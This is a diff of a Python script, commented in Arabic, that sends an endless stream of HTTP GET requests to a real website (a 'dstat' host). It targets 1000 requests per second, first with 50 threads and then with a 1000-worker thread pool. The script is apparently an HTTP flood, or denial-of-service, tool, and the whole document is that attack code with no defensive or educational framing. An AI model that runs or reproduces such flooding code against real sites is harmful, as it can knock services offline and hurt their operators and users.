@@ -1,88 +1,34 @@
 import requests
-import threading
 import time
-import sys
+from concurrent.futures import ThreadPoolExecutor
+from threading import Lock
 
-# URL المستهدف
-TARGET_URL = "https://dstat.countbot.uk/"
+# إعدادات التحكم في عدد الخيوط والطلبات في الثانية
+MAX_REQUESTS_PER_SECOND = 1000
+TIME_BETWEEN_REQUESTS = 1.0 / MAX_REQUESTS_PER_SECOND  # الوقت بين كل طلب
 
-# الهدف: 1000 طلب في الثانية كحد أقصى
-REQUESTS_PER_SECOND = 1000
+# العنوان الذي سيتم إرسال الطلبات إليه
+url = "https://dstat.countbot.uk/"
 
-# عدد الخيوط
-NUM_THREADS = 50
+# قفل لتجنب إرسال طلبات متعددة في نفس اللحظة
+lock = Lock()
 
-# حساب الوقت بين كل طلب لكل خيط
-DELAY_PER_REQUEST = 1 / (REQUESTS_PER_SECOND / NUM_THREADS)
-
-# عداد لتتبع عدد الطلبات الناجحة
-successful_requests = 0
-lock = threading.Lock()
-
-# متغير للتحكم في حالة التشغيل
-running = True
-
-def make_request(thread_id):
-    """دالة لإرسال طلب HTTP"""
-    global successful_requests
-    while running:
+def send_request():
+    with lock:
+        # إرسال الطلب إلى الموقع
         try:
-            start_time = time.time()
-            response = requests.get(TARGET_URL, timeout=5)
-            
-            with lock:
-                successful_requests += 1
-            
-            elapsed = time.time() - start_time
-            sleep_time = max(0, DELAY_PER_REQUEST - elapsed)
-            time.sleep(sleep_time)
-            
-        except requests.exceptions.RequestException as e:
-            print(f"خطأ في الخيط {thread_id}: {e}")
-            time.sleep(1)  # تأخير قصير قبل المحاولة مجدداً
+            response = requests.get(url)
+            print(f"تم إرسال الطلب بنجاح. رمز الاستجابة: {response.status_code}")
+        except requests.RequestException as e:
+            print(f"حدث خطأ أثناء إرسال الطلب: {e}")
 
-def monitor_rate():
-    """دالة لمراقبة معدل الطلبات"""
-    global successful_requests
-    while running:
-        time.sleep(1)
-        with lock:
-            rate = successful_requests
-            successful_requests = 0
-        print(f"معدل الطلبات في الثانية: {rate}")
-        if rate > REQUESTS_PER_SECOND:
-            print("تحذير: تجاوز معدل الطلبات المطلوب!")
-
-def main():
-    global running
-    
-    # إنشاء الخيوط
-    threads = []
-    for i in range(NUM_THREADS):
-        t = threading.Thread(target=make_request, args=(i,), daemon=True)
-        threads.append(t)
-        t.start()
-
-    # خيط لمراقبة المعدل
-    monitor_thread = threading.Thread(target=monitor_rate, daemon=True)
-    monitor_thread.start()
-
-    # الاستمرار حتى يتم إيقاف البرنامج يدوياً
-    try:
-        print(f"بدء إرسال الطلبات إلى: {TARGET_URL}")
-        print(f"الهدف: {REQUESTS_PER_SECOND} طلب/ثانية")
-        print(f"عدد الخيوط: {NUM_THREADS}")
-        print(f"التأخير بين الطلبات لكل خيط: {DELAY_PER_REQUEST:.4f} ثانية")
+def execute_requests():
+    # استخدام ThreadPoolExecutor لإرسال الطلبات عبر خيوط متعددة
+    with ThreadPoolExecutor(max_workers=MAX_REQUESTS_PER_SECOND) as executor:
         while True:
-            time.sleep(1)  # الانتظار مع تقليل استهلاك المعالج
-            
-    except KeyboardInterrupt:
-        print("\nجارٍ إيقاف البرنامج...")
-        running = False
-        for t in threads:
-            t.join(timeout=2)
-        print("تم إيقاف البرنامج بنجاح")
-        sys.exit(0)
+            # إرسال طلبات على مدار الوقت المحدد
+            executor.submit(send_request)
+            time.sleep(TIME_BETWEEN_REQUESTS)
 
 if __name__ == "__main__":
-    main()
+    execute_requests()
